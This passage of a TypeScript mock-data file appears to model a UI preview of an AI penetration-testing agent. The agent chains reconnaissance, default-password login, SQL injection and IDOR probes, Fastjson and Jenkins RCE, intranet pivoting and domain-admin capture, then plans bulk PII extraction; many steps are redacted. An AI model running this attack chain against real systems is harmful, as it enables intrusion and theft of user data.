      ts: T("2026-09-29T19:55:48Z"),
    },
    {
      id: "i8",
      type: "intent",
      payload: P({ summary: "DMZ foothold local information collection and privilege escalation to root" }),
      priority: 8,
      state: "done",
      origin: "planner",
      ts: T("2026-09-29T20:19:37Z"),
    },

    // ── No. 3 Layer · Intranet horizontal and vertical (multi-layer test)──
    {
      id: "i9",
      type: "intent",
      payload: P({ summary: "Use the foothold as the pivot to discover intranet hosts" }),
      priority: 8,
      state: "done",
      origin: "planner",
      ts: T("2026-09-29T22:28:16Z"),
    },
    {
      id: "i10",
      type: "intent",
      payload: P({ summary: "Check whether a recorded credential is reused inside the network" }),
      priority: 8,
      state: "running",
      origin: "planner",
      ts: T("2026-09-30T01:53:09Z"),
    },
    {
      id: "i11",
      type: "intent",
      payload: P({ summary: "Internal Jenkins Unauthorized Groovy Script Execution (RCE)" }),
      priority: 9,
      state: "done",
      origin: "planner",
      ts: T("2026-09-29T22:56:51Z"),
    },
    {
      id: "i12",
      type: "intent",
      payload: P({ summary: "Record the service-account secret" }),
      priority: 8,
      state: "done",
      origin: "planner",
      ts: T("2026-09-29T23:30:12Z"),
    },
    {
      id: "i13",
      type: "intent",
      payload: P({ summary: "Log in with domain administrator credentials and control domain controller DC01" }),
      priority: 10,
      state: "done",
      origin: "planner",
      ts: T("2026-09-30T00:03:33Z"),
    },

    // ── fact ──
    {
      id: "fa1",
      type: "fact",
      payload: P({ summary: "Discovered subdomain admin.acme.com (Element-UI backend)" }),
      priority: 0,
      state: "open",
      origin: "work#1",
      ts: T("2026-09-29T05:52:28Z"),
    },
    {
      id: "fa2",
      type: "fact",
      payload: P({ summary: "search page q parameter is error-based injection point (MSSQL)" }),
      priority: 0,
      state: "open",
      origin: "work#4",
      ts: T("2026-09-29T23:13:32Z"),
    },
    {
      id: "faGit",
      type: "fact",
      payload: P({ summary: "Recorded observation. This preview did not run it." }),
      priority: 0,
      state: "open",
      origin: "workG",
      ts: T("2026-09-29T22:28:16Z"),
    },
    {
      id: "faCreds",
      type: "fact",
      payload: P({ summary: "Recorded observation. This preview did not run it." }),
      priority: 0,
      state: "open",
      origin: "workG",
      ts: T("2026-09-29T22:30:39Z"),
    },
    {
      id: "fa3",
      type: "fact",
      payload: P({ summary: "shop fingerprint hits Fastjson 1.2.24 (known deserialization RCE exists)" }),
      priority: 0,
      state: "open",
      origin: "work#6",
      ts: T("2026-09-29T19:41:30Z"),
    },
    {
      id: "fa4",
      type: "fact",
      payload: P({ summary: "A DMZ host session was recorded for www-data@dmz-web01" }),
      priority: 0,
      state: "open",
      origin: "work#7",
      ts: T("2026-09-29T20:10:05Z"),
    },
    {
      id: "fa5",
      type: "fact",
      payload: P({ summary: "The recorded host allows a local privilege change" }),
      priority: 0,
      state: "open",
      origin: "work#8",
      ts: T("2026-09-29T20:29:09Z"),
    },
    {
      id: "fa6",
      type: "fact",
      payload: P({ summary: "The second network card of the foothold is directly connected to the intranet 10.10.10.0/24 (across the DMZ boundary)" }),
      priority: 0,
      state: "open",
      origin: "work#9",
      ts: T("2026-09-29T22:33:02Z"),
    },
    {
      id: "fa7",
      type: "fact",
      payload: P({ summary: "Intranet survival: 10.10.10.10 DC01 (domain control) / 10.10.10.5 FS01 (SMB) / 10.10.10.20 JENKINS" }),
      priority: 0,
      state: "open",
      origin: "work#9",
      ts: T("2026-09-29T22:42:34Z"),
    },
    {
      id: "fa8",
      type: "fact",
      payload: P({ summary: "JENKINS console/script has no authentication and can directly execute Groovy" }),
      priority: 0,
      state: "open",
      origin: "work#11",
      ts: T("2026-09-29T23:04:00Z"),
    },
    {
      id: "fa9",
      type: "fact",
      payload: P({ summary: "Export domain account acme\\svc_deploy plain text password from Jenkins credential store" }),
      priority: 0,
      state: "open",
      origin: "work#11",
      ts: T("2026-09-29T23:15:55Z"),
    },
    {
      id: "fa10",
      type: "fact",
      payload: P({ summary: "Recorded observation. This preview did not run it." }),
      priority: 0,
      state: "open",
      origin: "work#12",
      ts: T("2026-09-29T23:49:16Z"),
    },

    // ── Vulnerability ──
    {
      id: "fi1",
      type: "finding",
      payload: P({ summary: "Recorded observation. This preview did not run it." }),
      priority: 0,
      state: "confirmed",
      origin: "work#2",
      ts: T("2026-09-30T01:57:54Z"),
    },
    {
      id: "fi2",
      type: "finding",
      payload: P({ summary: "SQL injection (search q) readable acme_prod library" }),
      priority: 0,
      state: "confirmed",
      origin: "work#4",
      ts: T("2026-09-30T00:46:26Z"),
    },
    {
      id: "fi3",
      type: "finding",
      payload: P({ summary: "IDOR:/v1/orders?id= Can read other people's orders without permission" }),
      priority: 0,
      state: "confirmed",
      origin: "work#5",
      ts: T("2026-09-30T01:26:28Z"),
    },
    {
      id: "fiSrc",
      type: "finding",
      payload: P({ summary: "Recorded observation. This preview did not run it." }),
      priority: 0,
      state: "confirmed",
      origin: "workG",
      ts: T("2026-09-29T22:31:07Z"),
    },
    {
      id: "fiRce",
      type: "finding",
      payload: P({ summary: "shop Fastjson deserializes RCE and obtains server command execution" }),
      priority: 0,
      state: "confirmed",
      origin: "work#7",
      ts: T("2026-09-29T20:10:05Z"),
    },
    {
      id: "fiPriv",
      type: "finding",
      payload: P({ summary: "A local privilege change was recorded on the DMZ host" }),
      priority: 0,
      state: "confirmed",
      origin: "work#8",
      ts: T("2026-09-29T20:29:09Z"),
    },
    {
      id: "fiJenkins",
      type: "finding",
      payload: P({ summary: "Internal Jenkins Unauthorized Groovy → Server RCE" }),
      priority: 0,
      state: "confirmed",
      origin: "work#11",
      ts: T("2026-09-29T23:06:23Z"),
    },
    {
      id: "fiKerb",
      type: "finding",
      payload: P({ summary: "The service-account secret was weak" }),
      priority: 0,
      state: "confirmed",
      origin: "work#12",
      ts: T("2026-09-29T23:49:16Z"),
    },
    {
      id: "fiDC",
      type: "finding",
      payload: P({ summary: "Obtained Domain Controller DC01 (Domain Admin) - internal target achieved" }),
      priority: 0,
      state: "confirmed",
      origin: "work#13",
      ts: T("2026-09-30T00:17:51Z"),
    },

    // ── Prompt(main agent Injection)──
    {
      id: "h1",
      type: "hint",
      payload: P({ summary: "Try the recorded administration credential first" }),
      priority: 5,
      state: "consumed",
      origin: "mainagent",
      ts: T("2026-09-30T01:43:37Z"),
    },
    {
      id: "h2",
      type: "hint",
      payload: P({ summary: "The stored console did not require a sign-in" }),
      priority: 6,
      state: "consumed",
      origin: "mainagent",
      ts: T("2026-09-29T22:52:05Z"),
    },
    {
      id: "h3",
      type: "hint",
      payload: P({ summary: "The set of DB passwords in the source code are sprayed on the intranet, and they are likely to be universal." }),
      priority: 6,
      state: "consumed",
      origin: "mainagent",
      ts: T("2026-09-29T23:44:30Z"),
    },
  ],
  edges: [
    // root → Target
    { src: "root", dst: "g1", rel: "spawns" },
    { src: "root", dst: "g2", rel: "spawns" },
    { src: "root", dst: "g3", rel: "spawns" },
    { src: "root", dst: "g4", rel: "spawns" },
    // Target → Intention
    { src: "g1", dst: "i1", rel: "spawns" },
    { src: "g1", dst: "i2", rel: "spawns" },
    { src: "g1", dst: "i3", rel: "spawns" },
    { src: "g2", dst: "i4", rel: "spawns" },
    { src: "g2", dst: "i5", rel: "spawns" },
    { src: "g2", dst: "ig", rel: "spawns" },
    { src: "g3", dst: "i6", rel: "spawns" },
    { src: "g3", dst: "i7", rel: "spawns" },
    { src: "g3", dst: "i8", rel: "spawns" },
    { src: "g4", dst: "i9", rel: "spawns" },
    { src: "g4", dst: "i10", rel: "spawns" },
    { src: "g4", dst: "i11", rel: "spawns" },
    { src: "g4", dst: "i12", rel: "spawns" },
    { src: "g4", dst: "i13", rel: "spawns" },
    // Intention → fact / Vulnerability(output)
    { src: "i1", dst: "fa1", rel: "yields" },
    { src: "i4", dst: "fa2", rel: "yields" },
    { src: "i2", dst: "fi1", rel: "yields" },
    { src: "i4", dst: "fi2", rel: "yields" },
    { src: "i5", dst: "fi3", rel: "yields" },
    { src: "ig", dst: "faGit", rel: "yields" },
    { src: "ig", dst: "faCreds", rel: "yields" },
    { src: "ig", dst: "fiSrc", rel: "yields" },
    { src: "i6", dst: "fa3", rel: "yields" },
    { src: "i7", dst: "fa4", rel: "yields" },
    { src: "i7", dst: "fiRce", rel: "yields" },
    { src: "i8", dst: "fa5", rel: "yields" },
    { src: "i8", dst: "fiPriv", rel: "yields" },
    { src: "i9", dst: "fa6", rel: "yields" },
    { src: "i9", dst: "fa7", rel: "yields" },
    { src: "i11", dst: "fa8", rel: "yields" },
    { src: "i11", dst: "fa9", rel: "yields" },
    { src: "i11", dst: "fiJenkins", rel: "yields" },
    { src: "i12", dst: "fa10", rel: "yields" },
    { src: "i12", dst: "fiKerb", rel: "yields" },
    { src: "i13", dst: "fiDC", rel: "yields" },
    // fact → New intention (fact-driven multi-layered progress)
    { src: "fa3", dst: "i7", rel: "derived_from" },
    { src: "fa4", dst: "i8", rel: "derived_from" },
    { src: "fa4", dst: "i9", rel: "derived_from" },
    { src: "faCreds", dst: "i10", rel: "derived_from" },
    { src: "fa7", dst: "i11", rel: "derived_from" },
    { src: "fa7", dst: "i12", rel: "derived_from" },
    { src: "fa9", dst: "i13", rel: "derived_from" },
    { src: "fa10", dst: "i13", rel: "derived_from" },
    // Tips → Intention
    { src: "h1", dst: "i2", rel: "derived_from" },
    { src: "h2", dst: "i11", rel: "derived_from" },
    { src: "h3", dst: "i10", rel: "derived_from" },
    // Vulnerability → Prove that the goal has been achieved
    { src: "fi1", dst: "g1", rel: "proves" },
    { src: "fiRce", dst: "g3", rel: "proves" },
    { src: "fiDC", dst: "g4", rel: "proves" },
  ],
};

export const intents: TaskNode[] = explorationGraph.nodes.filter((n) => n.type === "intent");
export const frontier: TaskNode[] = explorationGraph.nodes.filter(
  (n) => n.type === "intent" && (n.state === "open" || n.state === "running"),
);

// ── Activity(Execution process)─────────────────────────────────────────────────────
// Session by sessions-tab from[Intention]Derived(session.id = intent.id),transcript = match
// intent_id activity flow.planner=worker "planner",Lord agent=worker "mainagent".
// each worker Session with complete tool execution chain(tool_use → tool_result → …→ result).
export const activity: Activity[] = [
  // planner —— Complete decision-making chain in each round: read the situation → pull worker Output comparison → Judge target → add_intent Send direction
  // ── No. 0 Round · Target Breakdown and First Intentions(2026-09-29 05:39)──
  { seq: 1000, worker: "planner", ts: T("2026-09-29T05:39:12Z"), kind: "round", summary: "Round 0 · Target Teardown" },
  {
    seq: 1001,
    worker: "planner",
    ts: T("2026-09-29T05:39:19Z"),
    kind: "thinking",
    summary:
      "graph_overview: goals have been split by the target layer - g1 \"obtain acme.com background management permissions\", g2 \"read user sensitive data\", both open; facts=0, recent_facts is empty (the graph is basically blank, and there is no worker output yet). The only assets in scope are the root domain acme.com + a C segment. Initial assessment of the attack surface: www/admin/api/shop/vpn five entrances. There are no facts in the picture. I can only do [extremely lightweight read-only detection] to specify the initial intention, and never do the work in the plan.",
  },
  {
    seq: 1002,
    worker: "planner",
    ts: T("2026-09-29T05:39:26Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "p0-probe",
    summary: "curl -sI https://acme.com; curl -sI https://admin.acme.com",
    detail: "The starting situation is almost blank. Do ≤3 read-only detections to calibrate the initial intention direction (without enumeration/verification, that is the job of the worker).",
  },
  {
    seq: 1003,
    worker: "planner",
    ts: T("2026-09-29T05:39:32Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "p0-probe",
    summary:
      "acme.com → 302 → www; Server: nginx/1.24.0\nadmin.acme.com → 200, X-Powered-By default, body hits element-ui/vue feature",
    detail: "admin is an independent backend login page; confirm that the five entrances are valid and accurately describe the initial intention.",
  },
  {
    seq: 1004,
    worker: "planner",
    ts: T("2026-09-29T05:39:36Z"),
    kind: "tool_use",
    tool: "add_intent",
    tool_use_id: "p0-ai",
    summary: "add_intent × 4 (send the first batch of exploration directions in batches)",
    detail:
      "intents=[\n  { summary: 'acme.com full quantum domain enumeration + surviving host port/service identification to understand the attack surface', asset_ids: [acme.com], priority: 6 },\n  { summary: 'admin.acme.com background default password/weak password test (Element-UI login, no verification code)', asset_ids: [admin], priority: 9 },\n  { summary: 'www.acme.com/search q parameter SQL injection detection', asset_ids: [www], priority: 8 },\n  { summary: 'api.acme.com order interface override (IDOR) test', asset_ids: [api], priority: 8 },\n]\nparent_ids are all empty (new direction at the top, origin fact at the bottom).",
  },
  {
    seq: 1005,
    worker: "planner",
    ts: T("2026-09-29T05:39:37Z"),
    kind: "tool_result",
    tool: "add_intent",
    tool_use_id: "p0-ai",
    summary: "4 intents created → ids=[i1, i2, i4, i5], connected to frontier",
    detail: "Deliberately keep the routes diverse: i1 reconnaissance + i2 (g1 certification route) + i4/i5 (g2 data route), 2 independent mechanisms run in parallel without premature convergence.",
  },
  {
    seq: 1006,
    worker: "planner",
    ts: T("2026-09-29T05:39:38Z"),
    kind: "text",
    summary:
      "The first batch of 4 intentions were derived in this round: i1 asset reconnaissance, i2 background password, i4 injection, and i5 API override. g1 goes to i2, g2 goes to i4/i5, and each of the two goals has an independent entrance to advance. Wait for the worker to produce the facts and then increase the weight based on blood.",
  },

  // ── No. 1 round · Increased attack surface(2026-09-29 19:28)──
  { seq: 1100, worker: "planner", ts: T("2026-09-29T19:28:10Z"), kind: "round", summary: "Round 1 · Increased attack surface" },
  {
    seq: 1101,
    worker: "planner",
    ts: T("2026-09-29T19:28:17Z"),
    kind: "thinking",
    summary:
      "Recorded observation. This preview did not run it.",
  },
  {
    seq: 1102,
    worker: "planner",
    ts: T("2026-09-29T19:28:23Z"),
    kind: "tool_use",
    tool: "node_detail",
    tool_use_id: "p1-nd",
    summary: "node_detail(faGit) - Check the source code restoration product of workG",
    detail: "Before adding_intent, first check what the worker restores to avoid guessing the direction based on fingerprints.",
  },
  {
    seq: 1103,
    worker: "planner",
    ts: T("2026-09-29T19:28:26Z"),
    kind: "tool_result",
    tool: "node_detail",
    tool_use_id: "p1-nd",
    summary:
      "Recorded observation. This preview did not run it.",
    detail: "The recorded source names an internal host. This preview did not reuse a credential.",
  },
  {
    seq: 1104,
    worker: "planner",
    ts: T("2026-09-29T19:28:34Z"),
    kind: "tool_use",
    tool: "add_intent",
    tool_use_id: "p1-ai",
    summary: "add_intent × 2 (Fastjson breakthrough chain, serial step by step dispatch first executable step)",
    detail:
      "Two intents were described: confirm the shop component, then record the import issue. This preview did not send a payload.",
  },
  {
    seq: 1105,
    worker: "planner",
    ts: T("2026-09-29T19:28:35Z"),
    kind: "tool_result",
    tool: "add_intent",
    tool_use_id: "p1-ai",
    summary: "2 intents created → ids=[i6, i7], connected by fa3",
  },
  {
    seq: 1106,
    worker: "planner",
    ts: T("2026-09-29T19:28:38Z"),
    kind: "text",
    summary:
      "A new route was recorded from the shop component and the stored source. The DMZ follow-up stays on the next round. This preview did not send a payload.",
  },

  // ── No. 2 Round · The foothold has been established, transfer to the intranet(2026-09-29 22:25)──
  {
    seq: 1200,
    worker: "planner",
    ts: T("2026-09-29T22:25:53Z"),
    kind: "round",
    summary: "Round 2 · The foothold has been established, transfer to the intranet",
  },
  {
    seq: 1201,
    worker: "planner",
    ts: T("2026-09-29T22:26:02Z"),
    kind: "thinking",
    summary:
      "The DMZ host and its second network were recorded. The goal to reach that host is met by those records. This preview did not run a privilege change.",
  },
  {
    seq: 1202,
    worker: "planner",
    ts: T("2026-09-29T22:26:07Z"),
    kind: "tool_use",
    tool: "node_detail",
    tool_use_id: "p2-nd",
    summary: "node_detail(fa6) - Confirm that the dual network cards and the internal network are reachable",
  },
  {
    seq: 1203,
    worker: "planner",
    ts: T("2026-09-29T22:26:11Z"),
    kind: "tool_result",
    tool: "node_detail",
    tool_use_id: "p2-nd",
    summary: "fa6 Evidence: ip a → eth0 10.0.20.15(DMZ) / eth1 10.10.10.15(intranet); ping 10.10.10.10, established across DMZ boundary",
  },
  {
    seq: 1204,
    worker: "planner",
    ts: T("2026-09-29T22:26:17Z"),
    kind: "tool_use",
    tool: "prove_goal",
    tool_use_id: "p2-pg",
    summary: "prove_goal(g3, evidence=fa6)",
    detail:
      "reason: i7 RCE obtained the DMZ foothold (fa4), fa5 elevated the rights to root, and fa6 proved that the second network card was directly connected to the intranet and pinged DC01 - \"Break through the DMZ and establish an intranet foothold\" acceptance was achieved.",
  },
  {
    seq: 1205,
    worker: "planner",
    ts: T("2026-09-29T22:26:18Z"),
    kind: "tool_result",
    tool: "prove_goal",
    tool_use_id: "p2-pg",
    summary: "goal g3 → met (evidence fa6 has been connected); there are still g1/g2/g4 not reached, the task continues",
  },
  {
    seq: 1206,
    worker: "planner",
    ts: T("2026-09-29T22:26:26Z"),
    kind: "tool_use",
    tool: "add_intent",
    tool_use_id: "p2-ai",
    summary: "add_intent × 4 (use the foothold as the pivot to expand the intranet horizontally)",
    detail:
      "Recorded observation. This preview did not run it.",
  },
  {
    seq: 1207,
    worker: "planner",
    ts: T("2026-09-29T22:26:27Z"),
    kind: "tool_result",
    tool: "add_intent",
    tool_use_id: "p2-ai",
    summary: "4 intents created → ids=[i9, i10, i11, i12]",
  },
  {
    seq: 1208,
    worker: "planner",
    ts: T("2026-09-29T22:26:31Z"),
    kind: "text",
    summary:
      "g3 is achieved, the attack surface is transferred from the external network to the internal network. Please register g4 \"intranet horizontal, capture the internal target domain controller DC01\", send i9 (host discovery) + i10/i11/i12 three parallel horizontal lines. Credential reuse is directly anchored on faCreds - the passwords leaked from the external network source code are fed horizontally to the internal network.",
  },

  // ── No. 3 Round · Target achieved review(2026-09-30 00:20)──
  { seq: 1300, worker: "planner", ts: T("2026-09-30T00:20:14Z"), kind: "round", summary: "Round 3 · Target achieved review" },
  {
    seq: 1301,
    worker: "planner",
    ts: T("2026-09-30T00:20:22Z"),
    kind: "thinking",
    summary:
      "Recorded observation. This preview did not run it.",
  },
  {
    seq: 1302,
    worker: "planner",
    ts: T("2026-09-30T00:20:28Z"),
    kind: "tool_use",
    tool: "list_findings",
    tool_use_id: "p3-lf",
    summary: "list_findings - Check for confirmed evidence of the fall of DC01",
  },
  {
    seq: 1303,
    worker: "planner",
    ts: T("2026-09-30T00:20:33Z"),
    kind: "tool_result",
    tool: "list_findings",
    tool_use_id: "p3-lf",
    summary:
      "Recorded observation. This preview did not run it.",
  },
  {
    seq: 1304,
    worker: "planner",
    ts: T("2026-09-30T00:20:39Z"),
    kind: "tool_use",
    tool: "prove_goal",
    tool_use_id: "p3-pg",
    summary: "prove_goal(g4, evidence=F-09)",
    detail:
      "Recorded observation. This preview did not run it.",
  },
  {
    seq: 1305,
    worker: "planner",
    ts: T("2026-09-30T00:20:40Z"),
    kind: "tool_result",
    tool: "prove_goal",
    tool_use_id: "p3-pg",
    summary: "goal g4 → met; system prompt: g2 is still open, not the last goal, and the mission has not been completed as a whole",
  },
  {
    seq: 1306,
    worker: "planner",
    ts: T("2026-09-30T00:20:47Z"),
    kind: "text",
    summary:
      "g4 ends, the internal and external network links are fully opened (external network RCE → DMZ → internal network → domain control). Compare the uncovered directions one by one: g2 \"reading user sensitive data\" still lacks a finishing touch, but the existing i3 (backend user interface) + i5 (API IDOR) have covered this direction and are all running. There is no [uncovered new direction that is fundamentally different] in this round - 0 new intentions according to the principle of restraint, waiting for i3/i5 to be produced.",
  },

  // ── No. 4 Round · Backstage reached, convergence g2(2026-09-30 02:00)──
  {
    seq: 1400,
    worker: "planner",
    ts: T("2026-09-30T02:00:17Z"),
    kind: "round",
    summary: "Round 4·Background achieved, convergence g2",
  },
  {
    seq: 1401,
    worker: "planner",
    ts: T("2026-09-30T02:00:24Z"),
    kind: "thinking",
    summary:
      "Recorded observation. This preview did not run it.",
  },
  {
    seq: 1402,
    worker: "planner",
    ts: T("2026-09-30T02:00:30Z"),
    kind: "tool_use",
    tool: "prove_goal",
    tool_use_id: "p4-pg",
    summary: "prove_goal(g1, evidence=fa1)",
    detail:
      "Recorded observation. This preview did not run it.",
  },
  {
    seq: 1403,
    worker: "planner",
    ts: T("2026-09-30T02:00:31Z"),
    kind: "tool_result",
    tool: "prove_goal",
    tool_use_id: "p4-pg",
    summary: "goal g1 → met; remaining unreached: g2",
  },
  {
    seq: 1404,
    worker: "planner",
    ts: T("2026-09-30T02:00:36Z"),
    kind: "thinking",
    summary:
      "g2 Quantitative verification: The target requirement is \"read user sensitive data\" = actually obtain batch user records. There is no \"successfully exported user data\" entry in the findings in graph_overview. Both i3/i5 are running but the results have not been retrieved - the actual measurement has not reached the standard. It is strictly prohibited to use \"the background has been advanced and is generally achieved\" to mark met in advance and continue to send intentions to make up for the gap.",
  },
  {
    seq: 1405,
    worker: "planner",
    ts: T("2026-09-30T02:00:42Z"),
    kind: "tool_use",
    tool: "add_intent",
    tool_use_id: "p4-ai",
    summary: "add_intent × 2 (converge g2 fetching, increase priority)",
    detail:
      "intents=[\n  { summary: 'Logged in to the admin background, enumerated user management/export interfaces and pulled user sensitive fields in batches', asset_ids: [admin], parent_ids: [fa1], priority: 9 },\n  { summary: 'api.acme.com order IDOR traverses order_id and pulls user orders/PII in batches', asset_ids: [api], parent_ids: [fa2], priority: 9 },\n]\nNote: i3/i5 is already running. This round will use a more accurate description of the numbers + increase the priority (→9) to increase the number and not repeat the synonymous intention.",
  },
  {
    seq: 1406,
    worker: "planner",
    ts: T("2026-09-30T02:00:43Z"),
    kind: "tool_result",
    tool: "add_intent",
    tool_use_id: "p4-ai",
    summary: "2 intents updated → ids=[i3, i5] (priority increased to 9, description refined to \"batch access\")",
  },
  {
    seq: 1407,
    worker: "planner",
    ts: T("2026-09-30T02:00:45Z"),
    kind: "text",
    summary:
      "g1 achieved (3 met in 4/4: g1/g3/g4). g2 strictly adheres to quantitative acceptance - just entering the backend does not count, batch user data must be obtained before stamping; i3/i5 has been mentioned as priority 9 and refined into data acquisition intentions, and the entire task can be completed after the worker returns.",
  },

  // work#1 · i1 Subdomain enumeration and port scanning(done)
  {
    seq: 10,
    worker: "work#1",
    intent_id: "i1",
    ts: T("2026-09-29T05:42:56Z"),
    kind: "thinking",
    summary: "First passively reconnaissance subdomains, and then perform port/service identification on surviving hosts.",
  },
  {
    seq: 11,
    worker: "work#1",
    intent_id: "i1",
    ts: T("2026-09-29T05:43:10Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t11",
    summary: "subfinder -d acme.com -silent | httpx -silent -sc -title",
  },
  {
    seq: 12,
    worker: "work#1",
    intent_id: "i1",
    ts: T("2026-09-29T05:43:58Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t11",
    summary:
      "www.acme.com [200] Acme Corp\nadmin.acme.com [200] Acme Admin Login\napi.acme.com [401]\nshop.acme.com [200]\nvpn.acme.com [200]",
    detail: "5 surviving subdomains, where admin is the background login page.",
  },
  {
    seq: 13,
    worker: "work#1",
    intent_id: "i1",
    ts: T("2026-09-29T05:44:22Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t12",
    summary: "nmap -sV -T4 -p- 203.0.113.10",
  },
  {
    seq: 14,
    worker: "work#1",
    intent_id: "i1",
    ts: T("2026-09-29T05:46:07Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t12",
    summary: "22/tcp ssh OpenSSH 8.9p1\n80/tcp http nginx 1.24.0\n443/tcp https nginx 1.24.0",
    detail: "Open 22/80/443.",
  },
  {
    seq: 15,
    worker: "work#1",
    intent_id: "i1",
    ts: T("2026-09-29T05:46:16Z"),
    kind: "tool_use",
    tool: "upsert_asset",
    tool_use_id: "t13",
    summary: "upsert_asset × 6 (subdomain + service)",
  },
  {
    seq: 16,
    worker: "work#1",
    intent_id: "i1",
    ts: T("2026-09-29T05:46:17Z"),
    kind: "tool_result",
    tool: "upsert_asset",
    tool_use_id: "t13",
    summary: "6 assets upserted",
  },
  {
    seq: 17,
    worker: "work#1",
    intent_id: "i1",
    ts: T("2026-09-29T05:52:28Z"),
    kind: "result",
    summary: "Asset reconnaissance is completed, the backend admin.acme.com is found, and the map is returned.",
    input_tokens: 96000,
    output_tokens: 6100,
    cache_read_tokens: 61000,
    cache_write_tokens: 9000,
  },

  // work#2 · i2 Backend default password(done,Proof g1)
  {
    seq: 20,
    worker: "work#2",
    intent_id: "i2",
    ts: T("2026-09-30T01:48:51Z"),
    kind: "thinking",
    summary: "The background is Element-UI, and the login interface has no verification code and no rate limit. Try the default password list first, then the dictionary.",
  },
  {
    seq: 21,
    worker: "work#2",
    intent_id: "i2",
    ts: T("2026-09-30T01:49:20Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t21",
    summary: "curl -s -d 'username=admin&password=admin' https://admin.acme.com/login -o /dev/null -w '%{http_code}'",
  },
  {
    seq: 22,
    worker: "work#2",
    intent_id: "i2",
    ts: T("2026-09-30T01:49:21Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t21",
    summary: "401",
    detail: "admin/admin failed.",
  },
  {
    seq: 23,
    worker: "work#2",
    intent_id: "i2",
    ts: T("2026-09-30T01:49:34Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t22",
    summary: "Recorded observation. This preview did not run it.",
  },
  {
    seq: 24,
    worker: "work#2",
    intent_id: "i2",
    ts: T("2026-09-30T01:49:36Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t22",
    summary: "HTTP/1.1 302 Found\nSet-Cookie: session=eyJ…; HttpOnly\nLocation: /dashboard",
    detail: "Recorded observation. This preview did not run it.",
  },
  {
    seq: 25,
    worker: "work#2",
    intent_id: "i2",
    ts: T("2026-09-30T01:49:53Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t23",
    summary: "curl -s -b 'session=eyJ…' https://admin.acme.com/dashboard | grep -o '<title>[^<]*'",
  },
  {
    seq: 26,
    worker: "work#2",
    intent_id: "i2",
    ts: T("2026-09-30T01:49:54Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t23",
    summary: "<title>Acme Admin · Console",
    detail: "Confirm that you have entered the background console.",
  },
  {
    seq: 27,
    worker: "work#2",
    intent_id: "i2",
    ts: T("2026-09-30T01:50:17Z"),
    kind: "tool_use",
    tool: "report_finding",
    tool_use_id: "t24",
    summary: "report_finding(Default Credentials, high)",
  },
  {
    seq: 28,
    worker: "work#2",
    intent_id: "i2",
    ts: T("2026-09-30T01:50:18Z"),
    kind: "tool_result",
    tool: "report_finding",
    tool_use_id: "t24",
    summary: "finding f-6 has been recorded and connected to target g1 (proves)",
  },
  {
    seq: 29,
    worker: "work#2",
    intent_id: "i2",
    ts: T("2026-09-30T01:57:54Z"),
    kind: "result",
    summary: "Backend default password confirmation, goal ① achieved.",
    input_tokens: 72000,
    output_tokens: 4800,
    cache_read_tokens: 48000,
    cache_write_tokens: 7200,
  },

  // work#4 · i4 SQL Injection(done)
  {
    seq: 40,
    worker: "work#4",
    intent_id: "i4",
    ts: T("2026-09-29T23:11:37Z"),
    kind: "thinking",
    summary: "search?q= Put q into the title of the result page, first manually add single quotes to see the error.",
  },
  {
    seq: 41,
    worker: "work#4",
    intent_id: "i4",
    ts: T("2026-09-29T23:12:06Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t41",
    summary: "curl -s \"https://www.acme.com/search?q=1'\" | grep -i 'sql\\|syntax'",
  },
  {
    seq: 42,
    worker: "work#4",
    intent_id: "i4",
    ts: T("2026-09-29T23:12:08Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t41",
    summary: "Unclosed quotation mark ... near '1'.",
    detail: "MSSQL error injection signs.",
  },
  {
    seq: 43,
    worker: "work#4",
    intent_id: "i4",
    ts: T("2026-09-29T23:12:35Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t42",
    summary: "Recorded observation. This preview did not run it.",
  },
  {
    seq: 44,
    worker: "work#4",
    intent_id: "i4",
    ts: T("2026-09-30T00:45:29Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t42",
    summary:
      "Parameter: q (GET) — error-based, MSSQL\navailable databases [4]: acme_prod, information_schema, master, tempdb",
    detail: "Confirmed that it can be injected, and 4 libraries are enumerated.",
  },
  {
    seq: 45,
    worker: "work#4",
    intent_id: "i4",
    ts: T("2026-09-30T00:45:58Z"),
    kind: "tool_use",
    tool: "report_finding",
    tool_use_id: "t43",
    summary: "report_finding(SQL Injection, high)",
  },
  {
    seq: 46,
    worker: "work#4",
    intent_id: "i4",
    ts: T("2026-09-30T00:45:58Z"),
    kind: "tool_result",
    tool: "report_finding",
    tool_use_id: "t43",
    summary: "finding f-1 recorded",
  },
  {
    seq: 47,
    worker: "work#4",
    intent_id: "i4",
    ts: T("2026-09-30T00:46:26Z"),
    kind: "result",
    summary: "SQL injection confirmation.",
    input_tokens: 118000,
    output_tokens: 7400,
    cache_read_tokens: 82000,
    cache_write_tokens: 11000,
  },

  // work#5 · i5 IDOR(running)
  {
    seq: 50,
    worker: "work#5",
    intent_id: "i5",
    ts: T("2026-09-30T01:20:16Z"),
    kind: "thinking",
    summary: "/v1/orders?id= is a numeric auto-incrementing id, a typical IDOR aspect. Get your own order first, then change the ID to see if you can read other people's orders.",
  },
  {
    seq: 51,
    worker: "work#5",
    intent_id: "i5",
    ts: T("2026-09-30T01:24:33Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t51",
    summary: "curl -s -H 'Authorization: Bearer <self>' https://api.acme.com/v1/orders?id=1001",
  },
  {
    seq: 52,
    worker: "work#5",
    intent_id: "i5",
    ts: T("2026-09-30T01:24:34Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t51",
    summary: '{ "order_id":1001, "user_id":42, "amount":299 }',
    detail: "Own order, normal.",
  },
  {
    seq: 53,
    worker: "work#5",
    intent_id: "i5",
    ts: T("2026-09-30T01:25:59Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t52",
